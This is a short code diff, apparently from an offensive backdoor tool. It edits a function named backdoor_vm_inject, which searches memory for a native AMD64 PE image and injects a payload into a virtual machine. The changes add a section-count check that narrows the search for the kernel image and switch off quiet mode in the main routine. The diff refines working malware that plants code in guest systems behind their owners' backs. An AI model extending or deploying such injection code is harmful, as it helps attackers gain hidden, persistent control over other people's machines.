@@ -243,8 +243,9 @@ int backdoor_vm_inject(uint64_t pml4_addr, uint64_t *payload_addr, uint8_t *payl
                 RVATOVA(data, ((IMAGE_DOS_HEADER *)data)->e_lfanew); 
 
             // check for the sane header
-            if (hdr->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 && 
-                hdr->OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_NATIVE)
+            if (hdr->OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_NATIVE &&
+                hdr->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 &&                 
+                hdr->FileHeader.NumberOfSections > 10)
             {
                 IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)
                     RVATOVA(&hdr->OptionalHeader, hdr->FileHeader.SizeOfOptionalHeader);
@@ -399,8 +400,9 @@ _nt_found:
                 RVATOVA(data, ((IMAGE_DOS_HEADER *)data)->e_lfanew);
 
             // check for the sane header
-            if (hdr->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 &&
-                hdr->OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_NATIVE)
+            if (hdr->OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_NATIVE &&
+                hdr->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 &&
+                hdr->FileHeader.NumberOfSections > 10)
             {
                 IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)
                     RVATOVA(&hdr->OptionalHeader, hdr->FileHeader.SizeOfOptionalHeader);
@@ -2486,6 +2488,8 @@ int _tmain(int argc, _TCHAR* argv[])
     SetThreadAffinityMask(GetCurrentThread(), (uint64_t)(1 << cpu));
 
     printf("[+] Running on CPU #%x\n", cpu);
+
+    m_quiet = false;
 
     if (argc <= 2)
     {
